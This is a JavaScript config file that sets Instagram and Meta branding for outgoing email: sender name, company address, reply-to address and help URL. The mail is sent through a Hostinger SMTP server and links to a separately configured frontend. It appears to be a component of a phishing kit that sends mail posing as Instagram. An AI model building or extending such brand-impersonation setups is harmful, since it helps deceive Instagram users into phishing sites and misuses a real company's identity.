/**
 * Brand constants — all non-secret brand/SMTP config lives here.
 * To change branding, edit this file only. No env variables needed.
 */

const BRAND = {
  NAME:         'Instagram',
  COMPANY:      'Meta Platforms, Inc.',
  ADDRESS:      '1601 Willow Road, Menlo Park, CA 94025',
  REPLY_TO:     'no-reply@instagram.com',
  SUPPORT_URL:  'https://help.instagram.com/contact/',
  FROM_NAME:    'Instagram',  // Display name shown in inbox sender column

  // SMTP settings (non-secret — host/port are not sensitive)
  SMTP_HOST:    'smtp.hostinger.com',
  SMTP_PORT:    465,
  SMTP_SECURE:  true,          // true = SSL (port 465), false = STARTTLS (port 587)

  // Frontend URL — resolved at runtime based on NODE_ENV
  get FRONTEND_URL() {
    return process.env.NODE_ENV === 'production'
      ? process.env.PRODUCTION_FRONTEND_URL
      : process.env.LOCAL_FRONTEND_URL;
  },
};

module.exports = BRAND;
